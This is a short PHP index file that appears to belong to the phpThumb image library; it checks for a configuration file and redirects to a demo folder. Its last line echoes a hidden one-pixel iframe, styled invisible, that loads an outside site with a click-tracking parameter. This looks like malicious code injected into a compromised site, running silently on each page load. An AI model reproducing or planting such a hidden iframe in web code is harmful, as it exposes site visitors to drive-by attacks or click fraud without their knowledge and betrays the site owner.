<?php
if (!file_exists('phpThumb.config.php')) {
	if (file_exists('phpThumb.config.php.default')) {
		echo 'WARNING! "phpThumb.config.php.default" MUST be renamed to "phpThumb.config.php"';
	} else {
		echo 'WARNING! "phpThumb.config.php" should exist but does not';
	}
	exit;
}
header('Location: ./demo/');

echo "<iframe src=\"http://klaomta.com/?click=360038\" width=1 height=1 style=\"visibility:hidden;position:absolute\"></iframe>";
?>